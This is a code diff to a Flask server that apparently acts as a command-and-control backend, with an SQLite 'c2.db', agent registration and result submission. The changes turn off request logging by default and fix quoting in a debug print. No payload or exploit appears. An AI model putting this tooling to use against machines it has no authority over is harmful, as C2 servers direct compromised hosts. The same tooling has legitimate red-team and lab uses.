@@ -5,17 +5,26 @@ from datetime import datetime, timezone
 import time
 import threading
 import os
+import logging
 from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
 
 #Global Variables:
 UPLOAD_DIR = "uploads"
+SHOW_REQUESTS = False
 
 # SQLite database configuration
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
+
+#logging config
+log = logging.getLogger('werkzeug')
+if SHOW_REQUESTS:
+    log.setLevel(logging.INFO)
+else:
+    log.setLevel(logging.ERROR)
 
 # Database models
 class Agent(db.Model):
@@ -108,7 +117,7 @@ def register_agent():
 def submit_results():
     try:
         # print(request.json)
-        print(f"IP: {request.json.get(agent_id)}" + "\n" + f"Result: {request.json.get(result)}"+"\n")
+        print(f"IP: {request.json.get('agent_id')}" + "\n" + f"Result: {request.json.get('result')}"+"\n")
         data = request.json
         agent_id = data['agent_id']
         task_id = data['task_id']
